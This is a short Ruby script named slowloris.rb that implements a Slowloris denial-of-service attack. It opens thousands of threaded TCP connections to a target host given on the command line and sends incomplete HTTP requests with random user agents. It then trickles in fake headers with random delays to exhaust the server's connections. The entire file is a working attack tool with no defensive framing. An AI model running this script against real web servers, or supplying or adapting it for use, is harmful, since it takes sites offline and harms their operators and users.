require 'socket'
require 'optparse'
require 'thread/pool'

# slowly sends incomplete requests(via headers)

options = { port: 80, poolsize: 5000, requests: 10000, threads: 5000 }
OptionParser.new do |opts|
  opts.banner = "Usage: slowloris.rb [options]"

  opts.on('-h', '--host HOST', 'site host') { |v| options[:hostname] = v }
  opts.on('-p', '--port PORT', 'site port(default to 80)') { |v| options[:port] = v }
  opts.on('-r', '--requests COUNT', 'requests count(default to 10000)') { |v| options[:requests] = v }
  opts.on('-t', '--threads THREADS', 'threads count(default to 5000)') { |v| options[:threads] = v }
end.parse!

agents = File.readlines('agents.txt')
pool = Thread.pool(options[:threads].to_i)

options[:requests].to_i.times do
  pool.process do
    socket = TCPSocket.new options[:hostname], options[:port]
    headers = "GET / HTTP/1.1\r\nHost: #{options[:hostname]}\r\nUser-Agent: #{agents.sample.strip}\r\nContent-Length: #{rand(50..150)}\r\n"
    socket.write headers
    10.times do
      new_h = "X-a-#{rand(0..1000)}: b\r\n"
      socket.write new_h
      puts "wrote #{new_h}"
      sleep rand(2..5)
    end
  end
end
pool.shutdown
